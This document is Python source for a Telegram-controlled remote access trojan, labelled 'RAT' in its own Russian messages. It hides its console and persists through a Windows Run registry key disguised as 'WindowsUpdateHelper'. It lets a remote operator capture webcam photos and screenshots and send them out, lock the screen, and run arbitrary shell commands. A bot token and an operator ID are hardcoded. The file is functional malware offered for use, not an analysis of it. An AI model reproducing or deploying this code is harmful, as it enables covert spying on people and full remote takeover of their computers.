import telebot
from telebot import types
import subprocess
import os
import cv2
import ctypes
from PIL import ImageGrab
import winreg
import sys
import threading

BOT_TOKEN = '8702183921:AAELgXeYGQZKIDofV-kjRDyUYit8FNMpPUw'
AUTHORIZED_ID = '7854947962'

bot = telebot.TeleBot(BOT_TOKEN)

def add_to_startup():
    exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, 'WindowsUpdateHelper', 0, winreg.REG_SZ, exe_path)
    winreg.CloseKey(key)

def block_screen():
    ctypes.windll.user32.LockWorkStation()

def take_webcam_photo():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite('webcam.jpg', frame)
    cap.release()
    return 'webcam.jpg'

def take_screenshot():
    img = ImageGrab.grab()
    img.save('screenshot.png')
    return 'screenshot.png'

def check_auth(message):
    return message.from_user.id == AUTHORIZED_ID

def hide_console():
    if sys.platform == 'win32':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

@bot.message_handler(commands=['start'])
def start(message):
    if not check_auth(message):
        return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton('/block')
    btn2 = types.KeyboardButton('/photo')
    btn3 = types.KeyboardButton('/screenshot')
    btn4 = types.KeyboardButton('/cmd')
    markup.add(btn1, btn2, btn3, btn4)
    bot.send_message(message.chat.id, 'RAT активирован. Выберите команду:', reply_markup=markup)

@bot.message_handler(func=lambda m: True)
def handle(message):
    if not check_auth(message):
        return
    cmd = message.text.lower()
    if cmd == '/block':
        block_screen()
        bot.send_message(message.chat.id, 'Экран заблокирован')
    elif cmd == '/photo':
        path = take_webcam_photo()
        with open(path, 'rb') as f:
            bot.send_photo(message.chat.id, f)
        os.remove(path)
    elif cmd == '/screenshot':
        path = take_screenshot()
        with open(path, 'rb') as f:
            bot.send_photo(message.chat.id, f)
        os.remove(path)
    elif cmd.startswith('/cmd '):
        result = subprocess.run(cmd[5:], shell=True, capture_output=True, text=True)
        bot.send_message(message.chat.id, result.stdout or result.stderr or 'Выполнено')
    elif cmd == '/cmd':
        bot.send_message(message.chat.id, 'Введите команду в формате: /cmd <команда>')
    else:
        bot.send_message(message.chat.id, 'Используйте кнопки')

def run_bot():
    hide_console()
    add_to_startup()
    bot.polling()

if __name__ == '__main__':
    threading.Thread(target=run_bot).start()